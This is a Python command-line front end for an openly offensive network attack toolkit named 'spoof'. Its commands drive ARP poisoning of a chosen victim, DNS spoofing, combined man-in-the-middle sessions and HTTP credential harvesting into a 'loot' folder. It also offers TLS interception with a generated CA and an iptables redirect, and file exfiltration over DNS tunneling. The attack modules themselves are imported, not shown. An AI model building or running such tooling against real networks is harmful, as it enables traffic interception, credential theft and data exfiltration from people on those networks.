#!/usr/bin/env python3
from __future__ import annotations

import sys
from pathlib import Path
from typing import Optional

import typer
from rich.console import Console

from spoof import __version__
from spoof.banner import render_banner
from spoof.config import load_config, merge_cli_overrides, save_config, init_config
from spoof.session import SpoofSession, create_session
from spoof.health_check import run_health_check, display_health_check
from spoof.discovery import discover_network, display_discovery
from spoof.models import SpoofConfig, SpoofRule, ARPTarget, ARPVictim, MatchType, DNSAction, DNSMode
from spoof.platform import get_platform
from spoof.logger import setup_logger


app = typer.Typer(
    name="spoof",
    help="cross-platform dns & arp spoofing toolkit",
    add_completion=False,
    no_args_is_help=False,
)

console = Console()


@app.callback(invoke_without_command=True)
def main(
    ctx: typer.Context,
    config: Optional[Path] = typer.Option(
        None, "--config", "-c", help="path to config file (yaml)",
    ),
    mode: Optional[str] = typer.Option(
        None, "--mode", "-m", help="attack mode: dns, arp, mitm",
    ),
    interface: Optional[str] = typer.Option(
        None, "--interface", "-i", help="network interface to use",
    ),
    domain: Optional[str] = typer.Option(
        None, "--domain", "-d", help="target domain to spoof",
    ),
    spoof_ip: Optional[str] = typer.Option(
        None, "--spoof-ip", "-s", help="ip address to redirect to",
    ),
    gateway: Optional[str] = typer.Option(
        None, "--gateway", "-g", help="gateway ip for arp spoofing",
    ),
    victim: Optional[str] = typer.Option(
        None, "--victim", "-t", help="victim ip for arp spoofing",
    ),
    dns_mode: Optional[str] = typer.Option(
        None, "--dns-mode", help="dns spoof mode: race, intercept",
    ),
    log_level: Optional[str] = typer.Option(
        None, "--log-level", "-l", help="log level: DEBUG, INFO, WARNING, ERROR",
    ),
    banner: bool = typer.Option(
        False, "--banner", "-b", help="show banner and exit",
    ),
    capture: bool = typer.Option(
        False, "--capture", help="enable http credential capture",
    ),
    web_dashboard: bool = typer.Option(
        False, "--dashboard", help="enable web dashboard on port 8080",
    ),
):
    if ctx.invoked_subcommand is not None:
        return

    if banner:
        render_banner(console)
        raise typer.Exit()

    try:
        cfg = load_config(config)
    except FileNotFoundError:
        console.print("[yellow]no config file found, creating default...[/yellow]")
        cfg = init_config()

    cfg = merge_cli_overrides(
        cfg,
        mode=mode,
        interface=interface,
        domain=domain,
        spoof_ip=spoof_ip,
        gateway=gateway,
        victim=victim,
        dns_mode=dns_mode,
        log_level=log_level,
    )

    if not domain and not cfg.dns.targets and not cfg.arp.targets:
        render_banner(console)
        console.print("[yellow]no targets configured — launching interactive menu[/yellow]")
        from spoof.menu import SpoofMenu
        SpoofMenu().run()
        return

    render_banner(console)

    http_cap = None
    dash = None
    if capture:
        from spoof.capture import HTTPCapture
        http_cap = HTTPCapture(interface=cfg.session.interface or "")
    if web_dashboard:
        from spoof.dashboard_web import DashboardServer
        dash = DashboardServer(None, port=8080)

    session = SpoofSession(cfg, config_path=config, http_capture=http_cap)
    if dash:
        session._web_dashboard = dash
        dash._session = session

    try:
        session.start()
        import time
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        console.print("\n[yellow]shutting down...[/yellow]")
        session.stop()


@app.command()
def init(
    path: Optional[Path] = typer.Option(
        None, "--path", "-p", help="path to save config file",
    ),
):
    """initialize a default config file"""
    p = init_config(path)
    console.print(f"[green]config created:[/green] {p}")


@app.command()
def health():
    """run pre-flight health checks"""
    render_banner(console)
    report = run_health_check(console)
    display_health_check(report, console)


@app.command()
def discover(
    interface: Optional[str] = typer.Option(
        None, "--interface", "-i", help="network interface to scan",
    ),
):
    """discover devices on the network"""
    render_banner(console)
    platform = get_platform()
    iface = interface or platform.get_default_interface()
    if not iface:
        console.print("[red]no interface specified and could not detect default[/red]")
        raise typer.Exit(1)

    console.print(f"[cyan]scanning on interface: {iface}[/cyan]")
    results = discover_network(iface, console=console)
    display_discovery(results, console)


@app.command()
def dns(
    config: Optional[Path] = typer.Option(
        None, "--config", "-c", help="path to config file",
    ),
    interface: Optional[str] = typer.Option(
        None, "--interface", "-i", help="network interface",
    ),
    domain: Optional[str] = typer.Option(
        None, "--domain", "-d", help="target domain",
    ),
    spoof_ip: Optional[str] = typer.Option(
        None, "--spoof-ip", "-s", help="redirect ip",
    ),
    dns_mode: Optional[str] = typer.Option(
        None, "--dns-mode", help="dns mode: race, intercept",
    ),
):
    """start dns spoofing only"""
    try:
        cfg = load_config(config)
    except FileNotFoundError:
        cfg = SpoofConfig()

    cfg = merge_cli_overrides(
        cfg,
        mode="dns",
        interface=interface,
        domain=domain,
        spoof_ip=spoof_ip,
        dns_mode=dns_mode,
    )

    if not cfg.dns.targets:
        console.print("[red]no dns targets configured. use --domain and --spoof-ip[/red]")
        raise typer.Exit(1)

    render_banner(console)

    session = create_session(cfg, config)
    try:
        session.start()
        import time
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        console.print("\n[yellow]shutting down...[/yellow]")
        session.stop()


@app.command()
def arp(
    config: Optional[Path] = typer.Option(
        None, "--config", "-c", help="path to config file",
    ),
    interface: Optional[str] = typer.Option(
        None, "--interface", "-i", help="network interface",
    ),
    gateway: Optional[str] = typer.Option(
        None, "--gateway", "-g", help="gateway ip",
    ),
    victim: Optional[str] = typer.Option(
        None, "--victim", "-t", help="victim ip",
    ),
    interval: Optional[float] = typer.Option(
        2.0, "--interval", help="arp spoof interval in seconds",
    ),
):
    """start arp spoofing only"""
    try:
        cfg = load_config(config)
    except FileNotFoundError:
        cfg = SpoofConfig()

    cfg = merge_cli_overrides(
        cfg,
        mode="arp",
        interface=interface,
        gateway=gateway,
        victim=victim,
    )

    if interval and interval != 2.0:
        cfg.arp.interval = interval

    if not cfg.arp.targets:
        console.print("[red]no arp targets configured. use --gateway and --victim[/red]")
        raise typer.Exit(1)

    render_banner(console)

    session = create_session(cfg, config)
    try:
        session.start()
        import time
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        console.print("\n[yellow]shutting down...[/yellow]")
        session.stop()


@app.command()
def mitm(
    config: Optional[Path] = typer.Option(
        None, "--config", "-c", help="path to config file",
    ),
    interface: Optional[str] = typer.Option(
        None, "--interface", "-i", help="network interface",
    ),
    domain: Optional[str] = typer.Option(
        None, "--domain", "-d", help="domain to spoof",
    ),
    spoof_ip: Optional[str] = typer.Option(
        None, "--spoof-ip", "-s", help="redirect ip",
    ),
    gateway: Optional[str] = typer.Option(
        None, "--gateway", "-g", help="gateway ip",
    ),
    victim: Optional[str] = typer.Option(
        None, "--victim", "-t", help="victim ip",
    ),
):
    """start dns + arp spoofing (mitm mode)"""
    try:
        cfg = load_config(config)
    except FileNotFoundError:
        cfg = SpoofConfig()

    cfg = merge_cli_overrides(
        cfg,
        mode="mitm",
        interface=interface,
        domain=domain,
        spoof_ip=spoof_ip,
        gateway=gateway,
        victim=victim,
    )

    if not cfg.dns.targets and not cfg.arp.targets:
        console.print("[red]no targets configured[/red]")
        raise typer.Exit(1)

    render_banner(console)

    session = create_session(cfg, config)
    try:
        session.start()
        import time
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        console.print("\n[yellow]shutting down...[/yellow]")
        session.stop()


@app.command()
def targets(
    config: Optional[Path] = typer.Option(
        None, "--config", "-c", help="path to config file",
    ),
):
    """list configured targets"""
    try:
        cfg = load_config(config)
    except FileNotFoundError:
        console.print("[red]no config file found. run 'spoof init' first[/red]")
        raise typer.Exit(1)

    render_banner(console)

    if cfg.dns.targets:
        console.print("[bold green]DNS Targets:[/bold green]")
        for i, t in enumerate(cfg.dns.targets, 1):
            status = "[green]enabled[/green]" if t.enabled else "[dim]disabled[/dim]"
            action = t.action.value
            ip = t.redirect_ip or "-"
            console.print(f"  {i}. {t.pattern} → {ip} ({t.match_type.value}, {action}) [{status}]")
    else:
        console.print("[dim]no dns targets configured[/dim]")

    console.print()

    if cfg.arp.targets:
        console.print("[bold yellow]ARP Targets:[/bold yellow]")
        for i, t in enumerate(cfg.arp.targets, 1):
            status = "[green]enabled[/green]" if t.enabled else "[dim]disabled[/dim]"
            victims = ", ".join(v.ip for v in t.victims)
            console.print(f"  {i}. gateway:{t.gateway} ↔ victims:[{victims}] [{status}]")
    else:
        console.print("[dim]no arp targets configured[/dim]")


@app.command()
def add_target(
    domain: str = typer.Argument(..., help="target domain"),
    redirect_ip: str = typer.Option(
        None, "--ip", "-s", help="ip to redirect to (omit for block)",
    ),
    match_type: str = typer.Option(
        "exact", "--match", help="match type: exact, wildcard, regex",
    ),
    action: str = typer.Option(
        "redirect", "--action", "-a", help="action: redirect, block, forward",
    ),
    config: Optional[Path] = typer.Option(
        None, "--config", "-c", help="path to config file",
    ),
):
    """add a dns target rule"""
    try:
        cfg = load_config(config)
    except FileNotFoundError:
        cfg = SpoofConfig()

    rule = SpoofRule(
        pattern=domain,
        match_type=MatchType(match_type),
        action=DNSAction(action),
        redirect_ip=redirect_ip,
    )
    cfg.dns.targets.append(rule)
    save_config(cfg, config)
    console.print(f"[green]target added:[/green] {domain} → {redirect_ip or 'BLOCK'} ({action})")


@app.command()
def add_arp(
    gateway: str = typer.Argument(..., help="gateway ip"),
    victim: str = typer.Argument(..., help="victim ip"),
    config: Optional[Path] = typer.Option(
        None, "--config", "-c", help="path to config file",
    ),
):
    """add an arp spoofing target"""
    try:
        cfg = load_config(config)
    except FileNotFoundError:
        cfg = SpoofConfig()

    existing = next((t for t in cfg.arp.targets if t.gateway == gateway), None)
    if existing:
        existing.victims.append(ARPVictim(ip=victim))
    else:
        cfg.arp.targets.append(ARPTarget(gateway=gateway, victims=[ARPVictim(ip=victim)]))

    save_config(cfg, config)
    console.print(f"[green]arp target added:[/green] gateway:{gateway} ↔ victim:{victim}")


@app.command()
def remove_target(
    pattern: str = typer.Argument(..., help="domain pattern to remove"),
    config: Optional[Path] = typer.Option(
        None, "--config", "-c", help="path to config file",
    ),
):
    """remove a dns target rule"""
    try:
        cfg = load_config(config)
    except FileNotFoundError:
        console.print("[red]no config file found[/red]")
        raise typer.Exit(1)

    before = len(cfg.dns.targets)
    cfg.dns.targets = [t for t in cfg.dns.targets if t.pattern != pattern]
    after = len(cfg.dns.targets)

    if before == after:
        console.print(f"[yellow]pattern '{pattern}' not found[/yellow]")
    else:
        save_config(cfg, config)
        console.print(f"[green]removed target: {pattern}[/green]")


@app.command()
def menu():
    """launch interactive tui menu"""
    from spoof.menu import SpoofMenu
    SpoofMenu().run()


@app.command()
def auto_mitm(
    interface: Optional[str] = typer.Option(
        None, "--interface", "-i", help="network interface",
    ),
    spoof_ip: Optional[str] = typer.Option(
        None, "--spoof-ip", "-s", help="ip to redirect to",
    ),
    dns_target: Optional[str] = typer.Option(
        None, "--domain", "-d", help="target domain",
    ),
    capture: bool = typer.Option(
        False, "--capture", help="enable http credential capture",
    ),
    web_dashboard: bool = typer.Option(
        False, "--dashboard", help="enable web dashboard on port 8080",
    ),
):
    """auto-discover network and start mitm interactively"""
    from spoof.auto_mode import auto_mitm_setup
    from spoof.capture import HTTPCapture
    from spoof.dashboard_web import DashboardServer

    cfg = auto_mitm_setup(interface=interface, spoof_ip=spoof_ip, dns_target=dns_target, console=console)
    if not cfg:
        raise typer.Exit(1)

    http_cap = HTTPCapture(interface=cfg.session.interface) if capture else None
    dash = DashboardServer(None, port=8080) if web_dashboard else None

    session = SpoofSession(cfg, http_capture=http_cap)
    if dash:
        session._web_dashboard = dash

    try:
        session.start()
        import time
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        console.print("\n[yellow]shutting down...[/yellow]")
        session.stop()


@app.command()
def capture_http(
    interface: Optional[str] = typer.Option(
        None, "--interface", "-i", help="network interface",
    ),
    loot_dir: str = typer.Option(
        "loot", "--loot-dir", help="directory to save captured data",
    ),
):
    """capture http traffic and harvest credentials"""
    from spoof.capture import HTTPCapture

    platform = get_platform()
    iface = interface or platform.get_default_interface()
    if not iface:
        console.print("[red]no interface specified[/red]")
        raise typer.Exit(1)

    render_banner(console)
    capture = HTTPCapture(loot_dir=loot_dir, interface=iface)
    capture.start()

    try:
        import time
        while True:
            time.sleep(5)
            if capture.credentials:
                capture.display_loot(console)
    except KeyboardInterrupt:
        console.print("\n[yellow]stopping...[/yellow]")
        capture.stop()
        capture.display_loot(console)


@app.command()
def ssl_intercept(
    interface: Optional[str] = typer.Option(
        None, "--interface", "-i", help="network interface",
    ),
    port: int = typer.Option(
        8443, "--port", "-p", help="port to listen for tls interception",
    ),
    cert_dir: str = typer.Option(
        "certs", "--cert-dir", help="directory for generated certificates",
    ),
):
    """start ssl/tls interception proxy"""
    from spoof.ssl_intercept import SSLInterceptor

    render_banner(console)
    interceptor = SSLInterceptor(cert_dir=cert_dir, listen_port=port, interface=interface)
    interceptor.generate_ca()
    interceptor.start()

    console.print(f"[cyan]ssl interceptor running on port {port}[/cyan]")
    console.print(f"[cyan]ca cert:[/cyan] {interceptor._ca_cert_path}")
    console.print("[dim]redirect 443 → 8443: sudo iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8443[/dim]")

    try:
        import time
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        console.print("\n[yellow]stopping...[/yellow]")
        interceptor.stop()


@app.command()
def exfiltrate(
    filepath: str = typer.Argument(..., help="file to exfiltrate via dns"),
    domain: str = typer.Option(..., "--domain", "-d", help="exfiltration domain"),
    dns_server: str = typer.Option(..., "--dns-server", help="dns server to send queries to"),
    interface: Optional[str] = typer.Option(
        None, "--interface", "-i", help="network interface",
    ),
):
    """exfiltrate a file via dns tunneling"""
    from spoof.exfiltrate import DNSExfiltrator

    platform = get_platform()
    iface = interface or platform.get_default_interface()
    if not iface:
        console.print("[red]no interface specified[/red]")
        raise typer.Exit(1)

    render_banner(console)
    exfil = DNSExfiltrator(domain=domain, interface=iface, dns_server=dns_server)
    console.print(f"[cyan]exfiltrating {filepath} via {domain} -> {dns_server}...[/cyan]")
    if exfil.exfiltrate_file(filepath):
        console.print(f"[green]exfiltration complete: {exfil.stats}[/green]")
    else:
        console.print("[red]exfiltration failed[/red]")


@app.command()
def dashboard_web(
    port: int = typer.Option(8080, "--port", "-p", help="web dashboard port"),
):
    """start web dashboard (standalone)"""
    from spoof.dashboard_web import DashboardServer
    from spoof.models import SpoofConfig

    render_banner(console)
    cfg = SpoofConfig()
    session = SpoofSession(cfg)
    dash = DashboardServer(session, port=port)
    dash.start()
    console.print(f"[green]dashboard:[/green] http://localhost:{port}")
    console.print("[dim]ctrl+c to stop[/dim]")

    try:
        import time
        while True:
            time.sleep(5)
    except KeyboardInterrupt:
        console.print("\n[yellow]stopping...[/yellow]")


@app.command()
def version():
    """show version information"""
    render_banner(console)
    platform = get_platform()
    console.print(f"  [cyan]version:[/cyan]    {__version__}")
    console.print(f"  [cyan]platform:[/cyan]   {platform.name()}")
    console.print(f"  [cyan]root:[/cyan]       {platform.is_root()}")
    console.print(f"  [cyan]interfaces:[/cyan] {', '.join(platform.get_interfaces()[:5])}")


def entry():
    app()


if __name__ == "__main__":
    entry()
